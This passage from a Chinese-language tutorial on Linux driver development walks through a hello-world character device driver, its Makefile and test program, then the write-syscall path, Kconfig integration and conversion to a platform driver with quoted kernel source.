punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"hello_open\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ssize_t <span class="token function">hello_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"hello_write\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ssize_t <span class="token function">hello_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"hello_read\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    devNum <span class="token operator">=</span> <span class="token function">MKDEV</span><span class="token punctuation">(</span>reg_major<span class="token punctuation">,</span> reg_minor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//根据主设备号和次设备号手动生成设备号</span>    <span class="token comment">//注册到内核</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>OK <span class="token operator">==</span> <span class="token function">register_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">,</span> <span class="token string">"helloworld"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"register_chrdev_region ok \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"register_chrdev_region error n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">" hello driver init \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//申请结构体</span>    gDev <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cdev</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//cdev表示字符设备</span>    gFile <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>open <span class="token operator">=</span> hello_open<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>read <span class="token operator">=</span> hello_read<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>write <span class="token operator">=</span> hello_write<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>        <span class="token function">cdev_init</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> gFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cdev_add</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> devNum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> __exit <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//驱动卸载</span>    <span class="token function">cdev_del</span><span class="token punctuation">(</span>gDev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//module_init 声明驱动的入口函数 hello_init</span><span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//module_exit 声明驱动的出口函数 hello_exit</span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//模块许可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写Makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token keyword">ifneq</span> <span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">(</span>KERNELRELEASE<span class="token punctuation">)</span>,<span class="token punctuation">)</span>obj-m <span class="token operator">:=</span> helloDev.o <span class="token comment">#内核编译系统进行识别</span><span class="token keyword">else</span>PWD <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">shell</span> pwd<span class="token punctuation">)</span> KDIR<span class="token operator">:=</span> /lib/modules/4.4.0-31-generic/build <span class="token comment">#内核头文件的目录</span><span class="token comment">#KDIR := /lib/modules/`uname -r`/build </span><span class="token symbol">all</span><span class="token punctuation">:</span>make -C <span class="token variable">$</span><span class="token punctuation">(</span>KDIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> <span class="token comment">#-C进入内核目录执行</span><span class="token symbol">clean</span><span class="token punctuation">:</span>rm -rf *.o *.ko *.mod.c *.symvers *.c~ *~<span class="token keyword">endif</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>驱动不能链接和使用应用层的任何 lib 库，驱动需要引用内核的头文件和函数，所以编译时需指定内核源码的地址</p></blockquote></li><li><p>执行make进行编译和加载hello驱动到内核</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-driver-test.png" alt="加载驱动并查看内核日志"></p><p>可见执行insmod的时候，驱动文件里的hello_init被调用了</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-check-driver.png" alt="lsmod命令查看驱动"></p></li><li><p>编写应用程序测试hello驱动</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/select.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">DATA_NUM</span>    <span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> r_len<span class="token punctuation">,</span> w_len<span class="token punctuation">;</span>    fd_set fdset<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>DATA_NUM<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"hello world"</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/hello"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\r\n"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open file error\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open successe\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        w_len <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    r_len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d\r\n"</span><span class="token punctuation">,</span> w_len<span class="token punctuation">,</span> r_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\r\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>手动创建设备文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mknod</span> /dev/hello c <span class="token number">232</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-driver-test-succeeded.png" alt="执行测试程序"></p><p>执行dmesg查看驱动输出，发现驱动的hell_open, hello_write, hello_read被依次调用了</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-test.png" alt=""></p></li></ol><h3 id="应用层write-怎样调用到驱动的write">应用层write()怎样调用到驱动的write()</h3><ol><li><p>对write函数，C库只会做一些检查，然后就陷入write的系统调用，系统调用会通过软中断的方式陷入到内核空间里去执行</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211113-calling-process.png" alt="调用流程"></p></li><li><p>操作系统的系统调用是如何知道应该调用哪个驱动里的write函数？</p><ul><li><p>在hello驱动里，有定义主次设备号并组合成了devNum</p><p><code>cdev_init(gDev, gFile);</code>  建立了 gDev 和 gFile 的逻辑关系</p><p><code>cdev_add(gDev, devNum, 1);</code> 建立了 gDev 和 devNum 的逻辑关系</p></li><li><p>以上两句代码其实建立了gFile 和 devNum 的对应关系，也就是 file_operations 和主次设备号的对应关系</p></li><li><p>打开设备文件 /dev/hello 后就已经建立了这个文件和 hello 驱动里的 struct file 和 struct file_operations 的对应关系</p></li></ul></li><li><p>阅读内核 write 系统调用的实现部分</p><p>关键代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token operator">-&gt;</span>f_op<span class="token operator">-&gt;</span>write<span class="token punctuation">)</span> <span class="token keyword">return</span> file<span class="token operator">-&gt;</span>f_op<span class="token operator">-&gt;</span><span class="token function">write</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> p<span class="token punctuation">,</span> count<span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>判断 hello 驱动里有没有定义 write 函数，如果有，那就调用</p><p>所以按照如上的路径，应用程序里的 write 就顺利的调用到了 hello 驱动里的 write 函数</p><blockquote><p>注意：在 linux 里，在应用层用文件句柄也就是fd表示一个打开的文件，但是在内核里用 <code>struct file</code> 表示一个打开的文件，用 <code>struct file_operations</code> 表示对该文件的操作，他们之间是一一对应的</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211113-write-function-call.png" alt="fs/read_write.c"></p></blockquote></li></ol><p>​</p><h3 id="字符设备驱动代码添加到内核源码树">字符设备驱动代码添加到内核源码树</h3><ol><li><p>拷贝源码到字符设备文件夹中</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-move.png" alt=""></p></li><li><p>添加Makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-<span class="token variable">$</span><span class="token punctuation">(</span>CONFIG_HELLO<span class="token punctuation">)</span> <span class="token operator">+=</span> helloDev.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将驱动添加到内核源码树中，修改 Kconfig 文件</p><pre class="line-numbers language-none"><code class="language-none">config HELLO     tristate "hello device"     default y     help       hello device<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看配置</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-add-success.png" alt=""></p></li><li><p>重新编译内核（驱动编译到内核中，静态加载）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-recompiling-kernel.png" alt=""></p></li></ol><h3 id="字符设备驱动到平台设备驱动">字符设备驱动到平台设备驱动</h3><ol><li><p>platform驱动</p><ul><li><p>platform是一条虚拟总线，可以将一些设备放置在该虚拟设备总线上，设备为platform_device，要操作这些设备需要使用匹配的驱动，驱动为platform_driver</p></li><li><p>使用platform总线的好处</p><ul><li>把设备都挂接在一个pseudo总线上，便于管理，同时也符合Linux的设备模型机制。其结果是，配套的sysfs节点、设备电源管理都成为可能</li><li>隔离设备和驱动。在BSP中定义platform设备和它使用的资源、设备的具体配置信息；而在驱动中，只需要通过通用的API去获取资源和数据，做到了BSP相关代码和驱动代码的分离，使得驱动具有更好的可扩展性和跨平台性</li></ul></li></ul></li><li><p>将char设备驱动改造为platform驱动</p><p>当执行insmod时，驱动会在总线上查找与其对应的设备，查找成功后执行 probe 动作进行设备初始化，当驱动卸载后执行remove函数，进行退出动作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//头文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/platform_device.h&gt;</span></span><span class="token comment">//</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello_plat_release</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">resource</span> hello_dev_resource<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>start <span class="token operator">=</span> LEDBASE<span class="token punctuation">,</span><span class="token punctuation">.</span>end   <span class="token operator">=</span> LEDBASE <span class="token operator">+</span> LEDLEN <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">.</span>flags <span class="token operator">=</span> IORESOURCE_MEM<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//平台设备结构体</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> hello_device <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>name  <span class="token operator">=</span> <span class="token string">"hello-device"</span><span class="token punctuation">,</span><span class="token punctuation">.</span>id  <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">.</span>num_resources  <span class="token operator">=</span> <span class="token function">ARRAY_SIZE</span><span class="token punctuation">(</span>hello_dev_resource<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//指定资源</span><span class="token punctuation">.</span>resource  <span class="token operator">=</span> hello_dev_resource<span class="token punctuation">,</span><span class="token punctuation">.</span>dev <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>release <span class="token operator">=</span> hello_plat_release<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//平台驱动结构体</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> hellodev_driver <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>probe<span class="token operator">=</span> hellodev_probe<span class="token punctuation">,</span><span class="token punctuation">.</span>remove<span class="token operator">=</span> hellodev_remove<span class="token punctuation">,</span><span class="token punctuation">.</span>driver<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>owner<span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span><span class="token punctuation">.</span>name<span class="token operator">=</span> <span class="token string">"hello-device"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//初始化</span><span class="token keyword">int</span> <span class="token function">charDrvInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//注册平台设备和驱动</span><span class="token function">platform_device_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hello_device<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">platform_driver_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hellodev_driver<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">void</span> __exit <span class="token function">charDrvExit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">platform_device_unregister</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hello_device<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">platform_driver_unregister</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hellodev_driver<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">module_init</span><span class="token punctuation">(</span>charDrvInit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>charDrvExit<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>源码</p><p>platform_device结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token punctuation">{</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token keyword">int</span>id<span class="token punctuation">;</span>boolid_auto<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">device</span>dev<span class="token punctuation">;</span>u32num_resources<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">resource</span><span class="token operator">*</span>resource<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">platform_device_id</span><span class="token operator">*</span>id_entry<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>driver_override<span class="token punctuation">;</span> <span class="token comment">/* Driver name to force a match */</span><span class="token comment">/* MFD cell pointer */</span><span class="token keyword">struct</span> <span class="token class-name">mfd_cell</span> <span class="token operator">*</span>mfd_cell<span class="token punctuation">;</span><span class="token comment">/* arch specific additions */</span><span class="token keyword">struct</span> <span class="token class-name">pdev_archdata</span>archdata<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>platform_driver结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> <span class="token punctuation">{</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>probe<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>remove<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>shutdown<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>suspend<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> pm_message_t state<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>resume<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> driver<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">platform_device_id</span> <span class="token operator">*</span>id_table<span class="token punctuation">;</span>bool prevent_deferred_probe<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设备注册</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">platform_device_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span>pdev<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">device_initialize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">arch_setup_pdev_archdata</span><span class="token punctuation">(</span>pdev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">platform_device_add</span><span class="token punctuation">(</span>pdev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>驱动注册</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//platform_driver_register -&gt; __platform_driver_register</span><span class="token keyword">int</span> <span class="token function">__platform_driver_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">)</span><span class="token punctuation">{</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>owner <span class="token operator">=</span> owner<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>bus <span class="token operator">=</span> <span class="token operator">&amp;</span>platform_bus_type<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>probe <span class="token operator">=</span> platform_drv_probe<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>remove <span class="token operator">=</span> platform_drv_remove<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>shutdown <span class="token operator">=</span> platform_drv_shutdown<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">driver_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">struct</span> <span class="token class-name">bus_type</span> platform_bus_type <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>name<span class="token operator">=</span> <span class="token string">"platform"</span><span class="token punctuation">,</span><span class="token punctuation">.</span>dev_groups<span class="token operator">=</span> platform_dev_groups<span class="token punctuation">,</span><span class="token punctuation">.</span>match<span class="token operator">=</span> platform_match<span class="token punctuation">,</span><span class="token comment">//match函数用于之后匹配</span><span class="token punctuation">.</span>uevent<span class="token operator">=</span> platform_uevent<span class="token punctuation">,</span><span class="token punctuation">.</span>pm<span class="token operator">=</span> <span class="token operator">&amp;</span>platform_dev_pm_ops<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>驱动的匹配原则</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//driver_register -&gt; bus_add_driver -&gt; driver_attach</span><span class="token comment">//总线上找到设备，让驱动与设备进行匹配</span><span class="token keyword">int</span> <span class="token function">driver_attach</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">bus_for_each_dev</span><span class="token punctuation">(</span>drv<span class="token operator">-&gt;</span>bus<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> drv<span class="token punctuation">,</span> __driver_attach<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">__driver_attach</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv <span class="token 